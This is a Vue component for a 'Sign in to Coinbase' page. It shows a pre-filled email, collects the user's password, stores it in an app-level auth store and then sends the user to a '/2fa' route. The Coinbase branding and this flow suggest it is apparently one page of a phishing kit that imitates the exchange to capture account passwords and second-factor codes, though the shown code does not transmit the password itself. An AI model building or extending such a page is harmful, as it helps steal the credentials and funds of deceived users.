<template>
    <div class="flex flex-col items-center justify-center md:px-4 md:py-8 bg-white dark:bg-black dark:text-white text-black">
      <div class="w-full max-w-md space-y-4 md:border border-gray-300 rounded-lg p-6">
        <div>
          <h1 class="text-2xl font-semibold">Sign in to Coinbase</h1>
          <p class="text-sm py-2 text-gray-600">To continue to Account Management</p>
        </div>
  
        <!-- Email Input (Disabled with Icon) -->
        <div class="relative w-full">
           <img :src ='AVT' alt="Coinbase Logo" class="rounded-full absolute left-3 top-1/2 -translate-y-1/2 w-7 h-7" />
          
          <input
            :value="auth.email"
            type="text"
            disabled
            class="w-full pl-12 pr-4 py-4 border border-gray-300 rounded-md bg-gray-100 dark:bg-black text-sm font-medium cursor-not-allowed"
          />
        </div>
  
        <!-- Password Input -->
        <div>
          <label class="text-sm font-bold">Password</label>
          <div class="relative">
            <input
              :type="show ? 'text' : 'password'"
              v-model="password"
              class="w-full px-4 py-3 my-2 border border-gray-300 rounded-md"
            />
            <span class="absolute right-3 top-5 text-gray-500 cursor-pointer" @click="toggleVisibility">
              <font-awesome-icon :icon="show ? 'eye-slash' : 'eye'" />
            </span>
          </div>
          <p v-if="passwordError" class="text-red-500 text-sm mt-1">{{ passwordError }}</p>
  
          <div class="flex items-center justify-between mt-2">
            <a href="#" class="text-sm text-blue-600 hover:underline">Forgot password?</a>
          </div>
        </div>
  
        <!-- Continue Button -->
        <BaseButton variant="primary" class="w-full" @click="handleLogin">Continue</BaseButton>
      </div>
  
      <!-- Cancel Sign In -->
      <p class="text-[16px] text-center py-4 text-blue-700 cursor-pointer" @click="handleCancel">
        Cancel signing in
      </p>
    </div>
  </template>
  
  <script setup lang="ts">
  import { ref } from 'vue'
  import { useRouter } from 'vue-router'
  import { useAuthStore } from '../stores/authStore'
  import BaseButton from '../components/BaseButton.vue'
  import AVT from '../assets/default.jpg'
  
  // Font Awesome
  import { FontAwesomeIcon } from '@fortawesome/vue-fontawesome'
  import { faUser, faEye, faEyeSlash } from '@fortawesome/free-solid-svg-icons'
  import { library } from '@fortawesome/fontawesome-svg-core'
  library.add(faUser, faEye, faEyeSlash)
  
  const auth = useAuthStore()
  const router = useRouter()
  
  const password = ref('')
  const passwordError = ref('')
  const show = ref(false)
  
  const toggleVisibility = () => {
    show.value = !show.value
  }
  
  const handleLogin = () => {
    passwordError.value = ''
  
    if (!password.value) {
      passwordError.value = 'Password is required'
      return
    }
  
    if (password.value.length < 6) {
      passwordError.value = 'Password must be at least 6 characters'
      return
    }
  
    auth.setPassword(password.value)
    router.push('/2fa')
  }
  
  const handleCancel = () => {
    router.push('/login')
  }
  </script>
  

  